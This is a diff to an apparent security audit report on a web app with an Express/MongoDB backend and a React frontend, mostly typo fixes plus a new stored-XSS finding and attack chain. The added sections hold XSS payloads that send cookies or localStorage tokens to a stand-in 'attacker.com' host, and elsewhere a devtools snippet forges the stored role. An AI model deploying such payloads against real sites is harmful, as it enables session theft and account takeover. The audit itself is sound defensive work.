@@ -17,7 +17,7 @@
 - [x] 13 | `backend/src/controllers/` | Business logic
 - [x] 14 | `frontend/src/App.jsx` | Route structure, auth guards client-side
 - [ ] 15 | `frontend/src/pages/` | Sensitive data handling, localStorage abuse
-- [ ] 16 | `frontend/src/components/` | XSS surface, `dangerouslySetInnerHTML`
+- [x] 16 | `frontend/src/components/` | XSS surface, `dangerouslySetInnerHTML`
 - [x] 17 | `frontend/src/utils/` | Crypto helpers, token handling
 - [ ] 18 | `backend/src/utils/`, `commands/` | Hardcoded secrets, insecure helpers
 
@@ -29,7 +29,7 @@
 
 **Location:** `backend/.gitignore`, `backend/.env`, `frontend/.gitignore`, `frontend/.env`
 
-**Description:** Despite the repository being public on Github since 2023, the `.env` file containing production credentials was never committed to version control. Git history search confirms no credential strings appear in any of the 80+ commits. The `.gitignore` correctly excluded `.env` throughout the project lifecycle.
+**Description:** Despite the repository being public on GitHub since 2023, the `.env` file containing production credentials was never committed to version control. Git history search confirms no credential strings appear in any of the 80+ commits. The `.gitignore` correctly excluded `.env` throughout the project lifecycle.
 
 **Residual risk:** 
 
@@ -154,7 +154,7 @@ TLS termination in production was either handled by Heroku's built-in SSL (which
 
 - **Mass assignment protection at creation layer:** All create controllers explicitly whitelist fields passed to the database rather than passing the full request body. Notably, `role` is hardcoded as `'BASIC'` in the register controller rather than accepted from user input, demonstrating awareness of privilege escalation risk at the creation layer.
 
-- **Input validation on create endpoints:** Joi validation schemas are consistently implemented across all create controllers with type checking, lenght limits and format validation.
+- **Input validation on create endpoints:** Joi validation schemas are consistently implemented across all create controllers with type checking, length limits and format validation.
 
 - **Mongoose ObjectId casting:** Mongoose's strict ObjectId type casting provides implicit protection against NoSQL injection via ID parameters. MongoDB operators passed as ID values are rejected before reaching the database.
 
@@ -414,7 +414,7 @@ No `limit` option is configured. An attacker can send arbitrarily large JSON pay
 The following standard security middleware is absent:
 - `helmet`: Sets HTTP security headers (X-Frame-Options, X-Content-Type-Options, etc.).
 - `express-rate-limit`: Prevents brute force and DoS attacks.
-- `hpp`: Prevents HTTP parameter poluttion attacks.
+- `hpp`: Prevents HTTP parameter pollution attacks.
 
 **Issue 4: Raw error logging at application level (Low):**
 
@@ -433,7 +433,7 @@ app.use('/', routes)         // no rate limiting, no helmet
 
 **Impact:**
 - Wildcard CORS enables cross-site request forgery style attacks from any malicious domain against authenticated users.
-- Unbounded request body enables memory exhaustation DoS.
+- Unbounded request body enables memory exhaustion DoS.
 - Missing security headers leave the API response surface unprotected.
 
 **Recommendation:**
@@ -530,7 +530,7 @@ Any authenticated user can perform the following actions by adding `userrole: AD
 
 - Read full PII of all registered users.
 - Delete any user, event, lot, preoffer, ad or post.
-- Create, update or delete any content across the entire applicartion.
+- Create, update or delete any content across the entire application.
 - Access all admin-only data views.
 
 This constitutes a complete collapse of the application's access control model. The RBAC implementation provides zero security value.
@@ -588,16 +588,16 @@ A post controller is imported in the preoffers route but never used. This is dea
 
 **Location:** `backend/src/middlewares/check-user-credentials.js`, frontend HTTP client.
 
-**Description:** The client sends the JWT token in the Authorization header without the standard `Beared ` prefix. The middleware reads the header raw without stripping any prefix, which works correctly given the current client behavior.
+**Description:** The client sends the JWT token in the Authorization header without the standard `Bearer ` prefix. The middleware reads the header raw without stripping any prefix, which works correctly given the current client behavior.
 
-However this deviates from the RFC 7235 standard which defines the Authorization header format as `Beared <token>`. If a standars-compliant client or third integration sends the header with the `Bearer ` prefix, authentication will fail silently.
+However this deviates from the RFC 7235 standard which defines the Authorization header format as `Bearer <token>`. If a standards-compliant client or third integration sends the header with the `Bearer ` prefix, authentication will fail silently.
 
 **Evidence:**
 ```sh
 Authorization: eyJhbGci...  <= no "Bearer " prefix
 ```
 
-**Recommendation:** Standarize to RFC 7235 format on both client and server:
+**Recommendation:** Standardize to RFC 7235 format on both client and server:
 
 - Server: extract token with `request.headers.authorization?.split(' ')[1]`
 - Client: send header as `Authorization: Bearer <token>`
@@ -662,7 +662,7 @@ request.user = {
 
 **Description:** All create controllers implement Joi validation schemas (a positive development practice). However no update controller implements any validation. All update controllers accept the entire unvalidated request body and apply it directly to the model via `doc.set(request.body)`.
 
-This inconsistency (validation on create, none on update), suggests validation was added to creation flows to solve inmediate functional problems but was never applied systematically to the full CRUD surface.
+This inconsistency (validation on create, none on update), suggests validation was added to creation flows to solve immediate functional problems but was never applied systematically to the full CRUD surface.
 
 ### Finding 21: Mass assignment via unvalidated update controllers enables privilege escalation to ADMIN.
 
@@ -674,7 +674,7 @@ This inconsistency (validation on create, none on update), suggests validation w
 - [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
 - [OWASP Top 10 A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
 
-**Description:** All update controllers apply the entire unvalidated request body directly to the model using `doc.set(request.body)` followed by `doc.save()`. No field whitelistening, validation or sanitization is performed. This allows an attacker to modify any field on any model including sensitive fields as `role`, `mfaEnabled`, `password` and `email`.
+**Description:** All update controllers apply the entire unvalidated request body directly to the model using `doc.set(request.body)` followed by `doc.save()`. No field whitelisting, validation or sanitization is performed. This allows an attacker to modify any field on any model including sensitive fields as `role`, `mfaEnabled`, `password` and `email`.
 
 The user update endpoint is the most severe instance: Any authenticated user can escalate their own privileges to ADMIN by sending a single field in the update request body.
 
@@ -714,7 +714,7 @@ POST /login
 
 **Impact:**
 - Any self-registered user can escalate to ADMIN with a single request.
-- No exploitation of other vulenrabilities required. This is a standalone complete privilege escalation chain.
+- No exploitation of other vulnerabilities required. This is a standalone complete privilege escalation chain.
 - Combined with Finding 14 (broken role check) and Finding 2 (open registration), this creates a trivial path to full application compromise: `Register freely => Escalate to ADMIN => Bypass all role checks`.
 
 - All other update controllers are equally vulnerable to mass assignment. Event, lot, ad and preoffer models can have arbitrary fields overwritten.
@@ -845,7 +845,7 @@ This creates two attack vectors:
 **Confirmed:** Regex injection allows an unauthenticated attacker to bypass search intent and retrieve arbitrary post data. On a production dataset, ReDoS patterns could block the Node.js event loop causin denial of service for all users.
 
 **Impact:**
-  - Denial of service via event loop backing.
+  - Denial of service via event loop blocking.
   - Unauthorized data exposure via regex manipulation.
   - Amplified by lack of rate limiting (Finding 13).
 
@@ -887,9 +887,9 @@ const initialState = {
 };
 ```
 
-Since localStorage is fully accessible to JavaScript running in the browser, any attacker physical access to the browser or an XSS vector can manipulate these values directly.
+Since localStorage is fully accessible to JavaScript running in the browser, any attacker with physical access to the browser or an XSS vector can manipulate these values directly.
 
-**EVidence: localStorage role manipulation confirmed:**
+**Evidence: localStorage role manipulation confirmed:**
 
 ```js
 // Running in browser devtools console while logged in as BASIC user:
@@ -909,6 +909,18 @@ localStorage.setItem("user", JSON.stringify({
 
 **Note:** This attack requires no server interaction and leaves no server-side audit trail. It's purely a client-side bypass and does not grant actual backend privileges on its own, however, combined with Finding 14 (broken backend role via `userrole` header), full application compromise is achieved at both layers.
 
+**The bypass mechanism | RequireAuth reads role from localStorage:**
+  ```js
+  // RequireAuth/index.jsx
+  const roleMatches = allowedRoles.find((role) => role === auth.role)
+  // auth.role sourced from localStorage (attacker controlled).
+
+  // App.jsx
+  role: localStorage.getItem("role")  // Reads attacker-controlled value.
+  ```
+
+  Setting `localStorage.role = "ADMIN"` and updating the user object causes `roleMatches` to return truthy for any `allowedRoles` check, granting frontend access to all protected routes.
+
 **Impact:**
   - Frontend route protection via `RequireAuth` is completely bypassable.
   - MFA state (`mfaEnabled`) stored in localStorage can be disabled: `localStorage.setItem("user", JSON.stringify({...user, mfaEnabled: false}))`.
@@ -916,14 +928,14 @@ localStorage.setItem("user", JSON.stringify({
   - Combined with Finding 14 (broken backend role check), there is no effective access control at any layer.
 
 **Recommendation:**
-  - Store refrsh tokens in `HttpOnly cookies` inaccessible to JS entirely.
+  - Store refresh tokens in `HttpOnly cookies` inaccessible to JS entirely.
   - Never store role or security-sensitive flags in localStorage.
   - Derive authentication state from the verified JWT on each request rather than from client-stored values.
   - Frontend route protection should be treated as UX only, never as a security control.
 
 ---
 
-### Finding 25: Frontend error loggin exposes sensitive information in browser console.
+### Finding 25: Frontend error logging exposes sensitive information in browser console.
 
 **Severity: Low**
 
@@ -939,9 +951,18 @@ localStorage.setItem("user", JSON.stringify({
 })
 ```
 
-In production, this exposes token refresh errors, server response details and netowrk information to anyone with browser devtools open. This extends the systemic raw error logging pattern identified in Finding 19 to the frontend layer.
+In production, this exposes token refresh errors, server response details and network information to anyone with browser devtools open. This extends the systemic raw error logging pattern identified in Finding 19 to the frontend layer.
 
 Additionally, any refresh failure, including server errors caused by the DoS vulnerabilities in Finding 11, silently logs out all active users with no explanation, creating a potential availability impact.
+
+**Evidence (Frontend console logging across components):**
+  - `components/Ad/Fetcher.jsx`
+  - `components/LatestPostsAside/Fetcher.jsx`
+  - `components/SearchArticles/Fetcher.jsx`
+  - `components/TagsList/Fetcher.jsx`
+  - `components/UploadImage/index.jsx`
+  - `components/Weather/index.jsx`
+  - `utils/refresh-token.js`
 
 **Recommendation:**
   - Remove `console.error()` calls from production builds.
@@ -960,7 +981,7 @@ Additionally, any refresh failure, including server errors caused by the DoS vul
 - [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
 - [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
 
-**Description:** Image uploads are sent directly from the browser to Cloudinary without passing through the backend. All validation occurs client-side and is trivially bypasseable.
+**Description:** Image uploads are sent directly from the browser to Cloudinary without passing through the backend. All validation occurs client-side and is trivially bypassable.
 
 - **Issue 1: Client-side MIME type validation:**
   ```js
@@ -975,10 +996,10 @@ Additionally, any refresh failure, including server errors caused by the DoS vul
   const sanitized = DOMPurify.sanitize(reader.result);
   ```
 
-  DOMPurify is an HTML sanitizer applied here to a base64-encoded image data URL. It provides no security value in this context, as base64 image data is not an HTML injection surface. This is a security theater that may additionally corrput image preview data.
+  DOMPurify is an HTML sanitizer applied here to a base64-encoded image data URL. It provides no security value in this context, as base64 image data is not an HTML injection surface. This is a security theater that may additionally corrupt image preview data.
 
 - **Issue 3: No server-side upload validation:**
-  Files are uploaded directly to Cloudinary from the browser. The backend has no visibility into what files are being uploaded, by whom or at what rate. THere's no audit trail, no rate limiting per user and no opportunity for server-side validation.
+  Files are uploaded directly to Cloudinary from the browser. The backend has no visibility into what files are being uploaded, by whom or at what rate. There's no audit trail, no rate limiting per user and no opportunity for server-side validation.
 
 - **Issue 4: Cloudinary credentials exposed in source:**
 
@@ -988,14 +1009,14 @@ Additionally, any refresh failure, including server errors caused by the DoS vul
   fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_ID}/image/upload`)
   ```
 
-  Both the cloud name and present name are hardcoded in the component source, compiled into the prodution bundle. This is the direct evidence for Finding 8.
+  Both the cloud name and preset name are hardcoded in the component source, compiled into the production bundle. This is the direct evidence for Finding 8.
 
 **Impact:**
 
 Uploaded images are attached to publicly accessible event pages visible to all site visitors without authentication. This means:
 
-  - A malicious file uploaded by an attacker (who can self-escalate to ADMIN via Finding 21) is inmediately served to every visitor of the platform.
-  - An SVG file contining embedded JS served from the Cloudinary domain could execute in visitors' browsers (Stored XSS with platform-wide reach).
+  - A malicious file uploaded by an attacker (who can self-escalate to ADMIN via Finding 21) is immediately served to every visitor of the platform.
+  - An SVG file containing embedded JS served from the Cloudinary domain could execute in visitors' browsers (Stored XSS with platform-wide reach).
   - The attack chain requires no victim interaction beyond visiting a public event page:
 
   ```
@@ -1010,6 +1031,71 @@ Browser => POST /api/upload (multipart) => Backend validates => magic bytes chec
 ```
 
 Use Cloudinary's signed upload API: The backend generates a short-lived signature, send it to the frontend, which uses it for a single upload. The API secret never leaves the server.
+
+---
+
+### Finding 27: Stored XSS via dangerouslySetInnerHTML on public blog post page.
+
+**Severity: Critical**
+
+**Location:** `frontend/src/pages/blog/PostById/index.jsx`, `frontend/src/pages/author-backoffice/MyPostById/components/Card/index.jsx`
+
+**Sources:**
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
+- [React dangerouslySetInnerHTML documentation](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
+
+**Description:** Two page components render post content directly into the DOM using React's `dangerouslySetInnerHTML` without sanitization:
+
+  - `PostById/index.jsx`: **Public page**, no authentication required.
+  - `MyPostById/Card/index.jsx`: Authenticated but still vulnerable.
+
+Post content is stored as raw HTML in MongoDB and served directly by the API with no sanitization at any layer. An attacker who can create or modify a post (achievable via Finding 21: Mass assignment privilege escalation), can inject arbitrary JS that executes in every visitor's browser when they view the post.
+
+**Evidence:**
+  - Post content confirmed to contain raw HTML in API responses.
+  - `dangerouslySetInnerHTML` renders content without sanitization.
+  - `PostById` is publicly accessible, no authentication required.
+  - Attacker can reach post creation via Finding 2 + Finding 21 chain.
+
+**Attack scenario:**
+  ```json
+  POST /posts/create (as escalated ADMIN)
+  Content-Type: application/json
+  {
+    "title": "Legitimate looking title",
+    "content": "<img src=x onerror=document.location='https://attacker.com/steal?c='+document.cookie>",
+    "published": true,
+    ...
+  }
+  => Post published to public blog
+  => Every visitor to /articulos/:id executes attacker JS
+  => Session tokens stolen from localStorage
+  ```
+
+**Impact:**
+  - Stored XSS with platform-wide reach affecting all unauthenticated visitors.
+  - Session token theft via localStorage access (Finding 24 compounds this. Tokens are stored in localStorage, accessible to injected JS).
+  - Full account takeover of any user who views the malicious post.
+  - Combines with Chain 2 (Finding 26) to create multiple stored XSS vectors.
+
+**Note:** DOMPurify is present as a dependency (Finding 11) but is misapplied to image data (Finding 26) rather than to post content where it's actually needed.
+
+**Recommendation:** Sanitize content before rendering with dangerouslySetInnerHTML:
+  ```jsx
+  import DOMPurify from 'dompurify'
+
+  // Instead of:
+  <div dangerouslySetInnerHTML={{ __html: content }} />
+
+  // Use:
+  <div dangerouslySetInnerHTML={{ 
+      __html: DOMPurify.sanitize(content) 
+  }} />
+  ```
+  Update DOMPurify to latest version first (Finding 11). The current version has multiple XSS bypass vulnerabilities.  
+
+---
 
 ## Vulnerability chains:
 
@@ -1056,6 +1142,8 @@ This chain demonstrates how an unauthenticated attacker can achieve complete adm
 - Finding 14 — Broken role-based access control
 - Finding 5 — MongoDB exposed to internet (enables direct DB access once credentials obtained)
 
+---
+
 ### Chain 2: Stored XSS via file upload | Platform-wide impact
 
 **Severity: Critical**
@@ -1091,3 +1179,38 @@ Step 4: Every visitor executes attacker JavaScript:
 - Finding 26 — Client-side only file validation
 - Finding 24 — Auth state in localStorage (tokens stealable via XSS)
 - Finding 8 — Cloudinary unsigned preset (now fixed, but architecture remains vulnerable)
+
+---
+
+### Chain 3: Stored XSS via blog post | Session hijacking at scale.
+
+**Severity: Critical**
+
+- Step 1: Gain ADMIN access (Findings 2 & 21):
+  Register => escalate role to ADMIN via mass assignment.
+
+- Step 2: Create malicious post:
+  ```json
+  POST /posts/create
+  { "content": "<img src=x onerror=fetch('https://attacker.com?c='+localStorage.getItem('token'))>", "published": true }
+  ```
+
+- Step 3: Post served to all visitors:
+  ```json
+  GET /articulos/:id  => public, no auth required
+  dangerouslySetInnerHTML renders injected script
+  localStorage token exfiltrated to attacker server
+  ```
+
+- Step 4: Attacker uses stolen tokens:
+  Stolen JWT used to authenticate as victim user.
+  Stolen refreshToken extends for 48 hours.
+
+**Findings involved:**
+- Finding 2 — Open registration
+- Finding 21 — Mass assignment privilege escalation
+- Finding 27 — Stored XSS via dangerouslySetInnerHTML
+- Finding 24 — Auth tokens in localStorage (stealable via XSS)
+- Finding 11 — Vulnerable DOMPurify not applied where needed
+
+---
